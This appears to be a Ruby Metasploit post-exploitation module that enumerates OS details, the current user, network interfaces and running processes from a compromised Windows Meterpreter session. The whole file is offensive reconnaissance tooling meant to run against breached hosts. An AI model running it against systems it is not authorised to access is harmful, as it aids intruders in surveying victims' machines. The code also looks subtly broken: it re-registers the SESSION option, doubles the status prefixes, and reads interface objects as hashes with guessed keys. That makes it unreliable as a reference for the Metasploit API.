#!/usr/bin/env ruby
# information_gathering.rb
# A Metasploit post-exploitation module to gather system, user, network, and process information.
# Place this file in: modules/post/windows/gather/information_gathering.rb

require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv
  
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Windows Information Gathering',
      'Description'    => %q{
        Gathers OS version, user accounts, network configuration, and running processes
        from a Windows Meterpreter session.
      },
      'Author'         => ['Ahmed Belhaj', 'Xavier'],
      'License'        => MSF_LICENSE,
      'Platform'       => ['win'],
      'SessionTypes'   => ['meterpreter']
    ))

    register_options([
      OptInt.new('SESSION', [true, 'Session to run this module on']),
    ])
  end

  def run
    sess = client
    print_status("[*] Gathering system information from #{sess.session_host}")

    # System Info
    sysinfo = sess.sys.config.sysinfo
    print_line("[*] OS: #{sysinfo['OS']} (Build #{sysinfo['Build']}, #{sysinfo['Architecture']}-bit)")
    print_line("[*] Computer: #{sysinfo['Computer']}")

    # User Info
    user = sess.sys.config.getuid
    print_line("[*] User: #{user}")

    # Network Info
    print_status("[*] Gathering network interfaces:")
    sess.net.config.interfaces.each do |iface|
      name    = iface['name'] || iface['interface']
      ip      = iface['ip'] || iface['ipaddress']
      netmask = iface['netmask']
      print_line("[*] Interface: #{name}, IP: #{ip}, Netmask: #{netmask}")
    end

    # Processes
    print_status("[*] Gathering running processes:")
    begin
      procs = sess.sys.process.processes
      procs.each do |p|
        print_line("[*] Process #{p['pid']} - #{p['name']}")
      end
    rescue
      print_error("[-] Could not enumerate processes")
    end

    print_status("[*] Information gathering completed")
  end
end